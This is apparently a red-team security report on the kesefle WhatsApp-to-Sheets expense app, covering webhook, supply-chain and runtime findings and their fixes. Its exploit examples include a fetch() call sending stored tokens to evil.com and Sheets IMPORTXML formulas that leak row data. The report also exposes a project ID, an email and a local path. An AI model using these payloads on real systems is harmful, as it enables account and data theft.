# Red Team Report #3 — WhatsApp Webhook + Supply Chain + Dependency Vectors

Scope: `api/whatsapp/webhook.js`, the Apps Script bot in `bot/`, and external resources loaded by `index.html`, `account.html`, `dashboard.html` (and the secondary `privacy.html`, `terms.html`, `test.html`).

Severity scale: **CRITICAL** (immediate exploitation, money/data loss) · **HIGH** (likely exploitation, sensitive impact) · **MEDIUM** (requires conditions, partial impact) · **LOW** (theoretical / defense-in-depth).

---

## WHATSAPP-SPECIFIC FINDINGS

### F1. Webhook replay window past idempotency TTL — MEDIUM
**File:** `api/whatsapp/webhook.js:184-199`

**Where it fails:** The idempotency check stores `seen:wa:<messageId>` with `EX=86400` (24h). After 24 hours the key is gone. An attacker who captured a signed Meta payload (compromised log host, leaked tcpdump, hostile intermediate proxy in dev, an old Vercel build log retained by Logflare/Axiom) can replay the exact bytes after 24h and the webhook will re-process it as new. The HMAC verifies — Meta has no timestamp in the signature scheme — so `verifyMetaSignature` returns true. A duplicate row is written to the user's sheet, a duplicate WhatsApp reply is sent (counts against the user's 24h messaging window quota), and `last_inbound:<phone>` is bumped, fooling 24h-window compliance logic into thinking the user is engaged.

**Exploit:**
1. Attacker obtains one signed webhook body (via log leak or by tricking the user into forwarding a Meta debug dump).
2. >24h later, attacker POSTs the byte-identical body to `/api/whatsapp/webhook` with the matching `x-hub-signature-256` header.
3. Webhook accepts as fresh → writes ghost row → sends WhatsApp echo (could carry attacker-chosen Hebrew text).

**Fix:**
- Extract `entry[0].changes[0].value.messages[0].timestamp` (Meta provides it, in seconds since epoch). Reject if `now - ts > 600s` (10 min skew tolerance).
- Increase idempotency TTL to **30 days** (Meta retries for up to 24h; a 30-day key is cheap on KV and kills the window).
- Optionally: also keep a `replay_lastseen_ts:<messageId>` value and refuse if the same id arrives again ever — combined with a periodic GC sweep.

---

### F2. Phone-number spoofing inside a valid signature — HIGH
**File:** `api/whatsapp/webhook.js:98-104, 118, 203`

**Where it fails:** Meta's `x-hub-signature-256` is HMAC-SHA256 keyed by the **app secret**, not by the WhatsApp sender's identity. **Anyone holding the app secret** (which the same Meta business account uses for *all* webhooks including third-party tools the developer might integrate, internal teammates, future contractors, leaked CI envs, prior tenants of the same Vercel project) can mint payloads with `messages[0].from = "972500000000"` to **impersonate any kesefle user**. The webhook then:

- Looks up `phone:972500000000` in KV → resolves to the victim's `userRecord` with `refreshToken`.
- Writes attacker-controlled rows to the victim's Google Sheet using the victim's stored refresh token.
- Sends WhatsApp replies *to the victim's phone* (the spoofer cannot read them, but can spam the victim).

**Exploit (assuming app secret leaks once):**
```
POST /api/whatsapp/webhook
x-hub-signature-256: sha256=<hmac(app_secret, body)>
body: {"object":"whatsapp_business_account","entry":[{"changes":[{"value":{"messages":[{"id":"forged-<random>","from":"<VICTIM_E164>","type":"text","text":{"body":"99999 שכר דירה"}}]}}]}]}
```
Result: ₪99,999 expense for "שכר דירה" lands in the victim's sheet, victim gets the confirmation WhatsApp.

**Fix (defense-in-depth, since the app secret is the trust root):**
- Treat the app secret like the production database password — rotate via Meta App Settings every 90 days.
- Restrict the webhook to **only the Meta-controlled phone-number IDs** you actually own: validate `entry[0].changes[0].value.metadata.phone_number_id === process.env.META_PHONE_NUMBER_ID` before any processing. Spoofed payloads pointing at your number ID still work, but you've shrunk the attack surface from "anyone with the secret" to "anyone with the secret AND knowledge of your phone-number ID" (low marginal but blocks one class of mistake).
- Add a Vercel egress IP allow-list for inbound: Meta publishes webhook source IP ranges. Verify `x-forwarded-for` (Vercel's trusted header) is in the Meta range. This is the strongest defense — attacker would need both the secret AND a way to send from Meta IP space.
- Log `entry.id`, `messaging_product`, and metadata to a SIEM / alert on any mismatch with your owned IDs.

---

### F3. Outbound template/echo injection — MEDIUM
**File:** `api/whatsapp/webhook.js:48-72, 224`

**Where it fails:** `sendReply` JSON-encodes `text.body` via `JSON.stringify`, so JSON escaping protects the wire format — there is no eval/template-string injection at the HTTP layer. **However**, the bot echoes `parsed.category` back at line 224: `` `✅ נרשם: ₪${parsed.amount} · ${parsed.category}` ``. `parsed.category` comes from `parseMessage` which sets `category: rest || 'אחר'` where `rest` is the raw user text minus the amount. The user is sending text to themselves so self-XSS is not the threat — but **if WhatsApp ever renders link previews from the bot's echo**, an attacker who tricks the user into sending a crafted message (e.g., via a malicious QR code "scan and send to track expense") could cause the *bot* to send back text containing `https://evil.com/phish?u=<userphone>`, which renders as a clickable link with the bot's blue-check sender identity. The user trusts that link source ("my bot sent me a link").

**Exploit:** Attacker prints a QR code at a café table: `whatsapp://send?phone=17745448053&text=99 https://kesefle.app.evil.com/auth?force_relink=1` → user scans, sends. Bot replies `✅ נרשם: ₪99 · https://kesefle.app.evil.com/...` carrying the link as official-looking text. User taps. Phishing site mimics the kesefle Google OAuth flow and steals the refresh token.

**Fix:**
- Strip URLs / `http(s)://` / `wa.me/` from `parsed.category` before echoing. A simple `.replace(/https?:\/\/\S+/gi, '[קישור]')` and `.replace(/\bwa\.me\/\S+/gi, '[קישור]')` blocks the obvious cases.
- Cap echoed text length to 60 chars (current parse already does this implicitly but make it explicit).
- Reject `parsed.category` containing zero-width chars, RTL override marks, or characters outside `֐-׿` (Hebrew), ` -~` (basic ASCII), `-ÿ` (Latin extended), and ` -⁯` minus the bidi controls. See F6.

---

### F4. KV / Vercel cost-amplification DoS — HIGH (financial)
**File:** `api/whatsapp/webhook.js` whole handler

**Where it fails:** Meta requires every POST be answered 200 OK or they retry. The handler does **up to 5 KV round-trips per webhook** (optout check, optout set/del where applicable, last_inbound set, seen check, seen set). Plus a Sheets API call. Plus a sendReply Graph API call. At Vercel pricing (~$0.18/million invocations + KV reads ~$0.20/million + function-seconds + Sheets quota), **an attacker who has the Meta app secret** (or who can find a way to bypass signature verification) can sustain 10,000 forged webhooks/sec and incinerate the budget. Even **without the secret**, a flood of unsigned POSTs forces `verifyMetaSignature` to run a SHA256 HMAC on each — that's CPU you pay for on Vercel — before returning 401.

**Exploit:** Distributed POST flood at the webhook URL. Each unsigned request costs you ~1 function invocation + body read + HMAC compute. At 1k req/s for 1h: ~3.6M invocations.

**Fix:**
- Add Vercel WAF / Edge Middleware rate limit: max 50 req/min per source IP, return 429 before the function executes (so no invocation billed).
- Reject `Content-Length > 16 KB` early (Meta payloads are typically <2 KB; anything larger is an abuse signal).
- Short-circuit unsigned: return 401 immediately if `x-hub-signature-256` header is absent. Currently the code still reads the body first; reorder so the header check happens before `readRawBody` for the unsigned-flood case (Meta always sends the header, so legit traffic is unaffected).
- Move the signature check to **edge middleware** (`middleware.js`) so unsigned requests don't even invoke the Node function.

---

### F5. Cross-tenant phone collision — MEDIUM
**File:** `api/whatsapp/webhook.js:203`

**Where it fails:** Lookup is `phone:${fromPhone}` — first-write-wins. Two real-world cases:
1. **Family WhatsApp on shared landline**: husband and wife both have kesefle accounts and the same physical SIM number. The second person to register either fails silently (overwrites the first) or *both* people's sheets get written via whoever's `userRecord` was stored last.
2. **Number recycling**: Israeli carrier reassigns a disconnected mobile number to a new customer 90 days later. New customer signs up for kesefle, sends a WhatsApp expense — it lands in the **previous owner's** sheet because `phone:` still maps to the old `userSub`.
3. **Account-takeover via WhatsApp number change**: User A is offboarded, their number is recycled to attacker B. B signs up for kesefle. The `phone:` record from A is still in KV (deletion path in `api/account/delete.js:77` is best-effort). Now B's WhatsApp messages write into… ambiguous state depending on whether the record was overwritten or kept.

**Exploit:** Cooperative — but the recycled-number case is a real privacy leak (user A's historical sheet is still receiving rows from B).

**Fix:**
- On `/api/sheet/provision`, before linking `phone:<E164>` → `userSub`, check if the key already exists and points to a *different* `userSub`. If so, refuse and surface an error: "This phone is linked to another kesefle account. Confirm via email link." (Send a confirm email to the *old* `userSub`'s email; only re-link on confirmation or after 30 days.)
- Add a quarterly "phone-number freshness ping" job: send users a `1` reaction to confirm number ownership. If no reaction in 60 days, mark the `phone:` record stale and require re-link.
- When `/api/account/delete` runs, do a full KV scan for `phone:*` values pointing at the deleted `userSub` and delete them synchronously — not best-effort.

---

### F6. Hebrew text / Unicode attacks in categories — MEDIUM
**File:** `api/whatsapp/webhook.js:120, 234-247`; also flows into Google Sheets

**Where it fails:** `parseMessage` accepts arbitrary text as `category`. The text then lands in column E of `תנועות` via `valueInputOption=USER_ENTERED` — which means **Sheets will evaluate it as a formula if it starts with `=`, `+`, `-` (with the right shape), or `@`**. Examples:

- `99 =HYPERLINK("https://evil.com/x?u=" & A1, "click")` → category cell renders as a clickable link inside the user's sheet. If the user has shared the sheet with anyone (accountant, spouse), the clicker leaks the timestamp/amount in the URL.
- `99 =IMPORTXML("https://evil.com/log?d=" & CONCATENATE(A1:I1), "//x")` → exfiltrates the row contents to attacker every time the sheet recalculates. Google rate-limits IMPORTXML but it works.
- `99 ‮drowssap` (U+202E RIGHT-TO-LEFT OVERRIDE) → category visually displays as `password` reversed; in a hostile shared-sheet context confuses readers.
- Zero-width joiners (`U+200D`), homoglyphs (Cyrillic `а` vs Latin `a`, Hebrew `‎` vs invisibles) in category strings cause false negatives in the dropdown / summary aggregation: "אובר" vs "או‌בר" (with U+200C) count as two distinct categories in pivots.

**Exploit:** Attacker tricks user into sending `99 =IMPORTXML(...)` (e.g., copy-pasteable "expense template" on a phishing site). User's sheet now exfiltrates every row to attacker as long as the user keeps it open.

**Fix:**
- Switch `valueInputOption=USER_ENTERED` to **`RAW`** for the `category`, `subcategory`, `raw_text` columns. Only the timestamp and amount need USER_ENTERED parsing (and timestamp is generated server-side as ISO — no user input there; amount is already a `parseFloat`).
- Or, simpler: prefix any cell whose value starts with `=`, `+`, `-`, `@`, `\t`, `\r` with a leading apostrophe `'` to defang formula injection. This is the standard defense against CSV/Sheets formula injection (OWASP recommendation).
- Strip Unicode bidi controls (`‪-‮`, `⁦-⁩`) and zero-width chars (`​-‍`, `﻿`) from all user text before storing.
- Add a server-side category whitelist: if `parsed.category` does not match any known keyword, store `'אחר'` and append the raw user text only to `raw_text` (column G) which is already opaque.

---

### F7. Apps Script project share scope — HIGH (operational, not code)
**File:** `bot/WHEN_YOU_ARE_BACK.md:12` references `https://script.google.com/d/1znNProbptLBkwqPmV-xWp6EirX7n_mJZvoJHf9si9Tw98y5-kvUgrHTo/edit`

**Where it fails:** The Apps Script project ID is committed to a doc file in the repo. The project, once deployed as a webhook with "anyone, even anonymous" access, executes under the **owner's identity** (`srcslcollection@gmail.com`). Any Drive editor on the project can:

1. View `WA_TOKEN` and `WA_PHONE_ID` script properties → impersonate the WhatsApp business for outbound messages to any number → phish kesefle users.
2. Read all `SpreadsheetApp.openById(...)` calls in code → enumerate every user-sheet ID the bot writes to.
3. Add a new function that iterates over sheets and emails them out → exfiltrate the entire user base's financial data.
4. Redeploy the webhook to point at attacker infrastructure.

**Exploit:** Steven shares the script with a contractor for one-off help. Contractor (or contractor's compromised Google account) keeps Editor access after the engagement. Six months later — pivot.

**Fix (operational, do today):**
- Open https://script.google.com/d/1znN.../edit → **Share** → audit access list. Remove every editor except `srcslcollection@gmail.com`. Use "Make a copy" workflows for contractors instead of granting Editor on the live project.
- Move `WA_TOKEN` to a Vercel KV-backed secret read at runtime by the Vercel webhook (which is already where production should live per `api/whatsapp/webhook.js`). Decommission the Apps Script webhook once Vercel handles all production WhatsApp traffic.
- Until then: rotate `WA_TOKEN` (Meta → System Users → revoke + reissue) and `META_APP_SECRET` quarterly.
- Add a 2-step verification requirement on the owner Google account (you may have this — verify it covers Apps Script deploys).
- Consider deploying the Apps Script as **"Execute as: User accessing the web app"** instead of "Me" — but this breaks the cross-user-sheet writing model. The right answer is to move off Apps Script for production.

---

## SUPPLY CHAIN FINDINGS

### F8. CDN poisoning — every external script can run as you — CRITICAL
**Files:** `index.html:44, 56, 64, 65`, `account.html:9, 15`, `dashboard.html:12`, `privacy.html:8`, `terms.html:8`, `test.html:8`

**Where it fails:** Every HTML page loads these scripts **without `integrity=` or `crossorigin=`** attributes:

| Page | Resource | Domain | Risk if compromised |
|---|---|---|---|
| index, dashboard, account, privacy, terms, test | `https://cdn.tailwindcss.com[?...]` | Vercel-operated (tailwindlabs) | Full XSS on every page; can steal the Google ID token, refresh tokens passed through `localStorage.kesefle_user`, and the OAuth access tokens that `account.html` minted via `tokenClient.requestAccessToken()` |
| index, account, dashboard, privacy, terms, test | `https://fonts.googleapis.com/css2?...Heebo...` | Google | Stylesheet poisoning → CSS exfiltration of form inputs (limited but real for `input[type=email]` via attribute selectors); plus the stylesheet's nested `url(...)` calls could request arbitrary endpoints |
| index, account | `https://accounts.google.com/gsi/client` | Google | Full XSS; controls the entire auth flow; intercepts ID tokens before they hit your callback |
| index (lazy) | `https://connect.facebook.net/he_IL/sdk.js` | Meta | Full XSS when FB login enabled |
| index (lazy) | `https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/he_IL/appleid.auth.js` | Apple | Full XSS when Apple login enabled |

`cdn.tailwindcss.com` is the highest risk: it's a **single-vendor playground CDN**, not their production-grade JIT delivery. Tailwind themselves [warn against using it in production](https://tailwindcss.com/docs/installation/play-cdn). If the CDN is compromised or hijacked (DNS, BGP, account takeover at the CDN), every kesefle visitor runs attacker JS.

**Exploit:** Attacker compromises `cdn.tailwindcss.com`. Replaces the served JS with a wrapper that calls original Tailwind code AND:
```js
fetch('https://evil.com/x', { method:'POST', body: localStorage.getItem('kesefle_user') });
// also hook window.google.accounts.oauth2.initTokenClient to exfiltrate access tokens
```
Every kesefle user logging in or visiting the dashboard now leaks their Google identity + tokens.

**Fix:**
- **Replace `cdn.tailwindcss.com` with a self-hosted, build-time-compiled CSS bundle.** This is the single highest-impact fix in this entire report. Tailwind CLI: `npx tailwindcss -i in.css -o /assets/tailwind.css --minify` at build time → commit + serve from your own origin under `vercel.json` immutable headers.
- Add `integrity=` SRI hashes to **every** remaining external `<script>` and `<link rel="stylesheet">` (see `sri-hashes.md`).
- Add `crossorigin="anonymous"` alongside each integrity attribute (required for SRI verification on cross-origin resources).
- Add a `Content-Security-Policy` response header in `vercel.json` to enforce script/style origins. Strict CSP:
  ```
  Content-Security-Policy: default-src 'self';
    script-src 'self' https://accounts.google.com https://apis.google.com https://connect.facebook.net https://appleid.cdn-apple.com;
    style-src 'self' https://fonts.googleapis.com 'unsafe-inline';
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' data: https://lh3.googleusercontent.com https://*.googleusercontent.com https://graph.facebook.com;
    connect-src 'self' https://oauth2.googleapis.com https://sheets.googleapis.com https://accounts.google.com https://www.googleapis.com https://graph.facebook.com https://appleid.apple.com;
    frame-src https://accounts.google.com https://appleid.apple.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self' https://appleid.apple.com;
  ```
  (The `'unsafe-inline'` on style is needed because Tailwind v3 Play CDN injects styles inline; **removing it is part of the self-hosted-Tailwind migration above**.)

---

### F9. Subresource Integrity (SRI) absent — HIGH
**Files:** same as F8.

**Where it fails:** Even if you keep the third-party scripts, you can pin their bytes. **None of the script/link tags have `integrity=` attributes.** This is independently checkable (zero hashes appear in any of the HTML files searched).

**Fix:** see `docs/security/sri-hashes.md` — file lists every external resource with a placeholder SHA-384 SRI hash and the shell command to compute the real value.

Note: Google GSI client, Facebook SDK, and Apple ID JS **publish new builds frequently** (sometimes daily). SRI on a versioned URL works; SRI on the unversioned `gsi/client` URL will *break the page every time Google re-publishes*. The practical pattern:
- Use SRI on Tailwind (you control your migration cadence; pin to a specific Tailwind compiled bundle hash → never changes).
- Skip SRI on Google/Facebook/Apple SDKs **and** mitigate via strict CSP `script-src` allow-list + cookie/token storage hardening (Trusted Types, HttpOnly cookies for any tokens you control server-side).
- Long-term: self-host the GSI client too (it's vendored by Google but the file is stable for weeks at a time — feasible with weekly CI bumps).

---

### F10. Vendor SDKs (Facebook, Apple) lazy-loaded but unverified — MEDIUM
**File:** `index.html:60-66`

**Where it fails:** The lazy-load is good (only loads if `cfg.FACEBOOK_APP_ID` / `cfg.APPLE_CLIENT_ID` are non-placeholder). But `addScript()` injects the URL into a `<script>` element with no `integrity`, no `crossorigin`, and no error handler. If the load fails or returns malicious content, the user's UI silently doesn't get FB / Apple SDKs, then `kesefleStartFacebook()` calls `FB.login(...)` on `undefined`, which throws and is caught at the surface by the surrounding try/catch — but a *malicious* SDK has full DOM access first.

**Fix:**
- When you turn on Facebook or Apple login, update `addScript()` to set `crossOrigin = 'anonymous'` and `integrity = '...'` from the published version-pinned URL.
- Better: replace `connect.facebook.net/he_IL/sdk.js` (which auto-versions) with `https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v19.0` (version-pinned) and compute the SRI hash for that exact version.
- Add a `script.onerror` handler that shows the user "Login provider unavailable" instead of hanging.

---

## RUNTIME FINDINGS

### F11. Prototype pollution via JSON.parse — LOW (in current code)
**File:** `api/whatsapp/webhook.js:108`

**Where it fails:** `JSON.parse(rawBody.toString('utf8'))` followed by `body?.entry?.[0]?.changes?.[0]?.value?.messages?.[0]`. Attacker payload `{"entry":[{"changes":[{"value":{"messages":[{"__proto__":{"polluted":true}}]}}]}]}` does **not** pollute `Object.prototype` in modern Node — `JSON.parse` puts `__proto__` as an own property on the inner object, not as a prototype link. **No exploitation in this codebase as written.**

**But:** if a future refactor uses `Object.assign(somethingShared, parsedBody)` or a deep-merge utility (`lodash.merge`, `deepmerge` < 4.x), this would become exploitable.

**Fix:** Defensive — use `JSON.parse(body, (k, v) => k === '__proto__' || k === 'constructor' || k === 'prototype' ? undefined : v)` as a reviver. Cheap, blocks the whole class.

---

### F12. ReDoS in waitlist email validator — LOW
**File:** `api/waitlist.js:47`

**Pattern:** `/^[^\s@]+@[^\s@]+\.[^\s@]+$/`

**Analysis:** Each `[^\s@]+` is a greedy quantifier on a *single character class*. The three classes are separated by **distinct literal anchors** (`@` and `.`) — they cannot overlap. There is no nested quantification, no alternation backtracking. This regex is **linear-time** on any input length. **Not vulnerable to catastrophic backtracking.** Confirmed safe.

**Fix:** None needed. (Per the regex-reviewer guidance at `.claude/agents/regex-reviewer.md:21`.)

---

### F13. NODE_TLS_REJECT_UNAUTHORIZED — clean
**Files:** entire repo searched.

`grep -rn 'NODE_TLS_REJECT_UNAUTHORIZED\|rejectUnauthorized' /Users/stevenrancohen/Documents/Claude/Projects/kesefle/` returned **zero matches**. No TLS verification bypass anywhere. Pass.

**Fix:** None. Keep it this way — add a CI lint rule that fails the build if either string appears in any file.

---

## SUMMARY TABLE

| # | Finding | Severity | Fix complexity |
|---|---|---|---|
| F1 | Webhook replay past 24h TTL | MEDIUM | Small — check `message.timestamp` + extend TTL |
| F2 | Phone-number spoofing under valid HMAC | HIGH | Medium — phone_number_id allowlist + Meta IP allowlist |
| F3 | Echo/template injection of URLs via category | MEDIUM | Small — sanitize echoed text |
| F4 | KV/Vercel cost DoS | HIGH | Medium — edge middleware rate-limit + size cap |
| F5 | Cross-tenant phone collision / recycled numbers | MEDIUM | Medium — confirm-before-relink flow |
| F6 | **Sheets formula injection via user text** | **HIGH** | Small — switch to RAW for text columns OR prefix `'` |
| F7 | Apps Script project over-shared | HIGH | Trivial — audit Drive access list today |
| F8 | **CDN poisoning of `cdn.tailwindcss.com` etc.** | **CRITICAL** | Medium — self-host Tailwind; add CSP |
| F9 | SRI absent on all external scripts | HIGH | Small — add hashes (see `sri-hashes.md`) |
| F10 | FB/Apple SDKs lazy-loaded unverified | MEDIUM | Small — pin versions + SRI |
| F11 | Prototype pollution surface | LOW | Trivial — JSON.parse reviver |
| F12 | ReDoS in email regex | LOW (safe) | None |
| F13 | NODE_TLS_REJECT_UNAUTHORIZED | LOW (clean) | None |
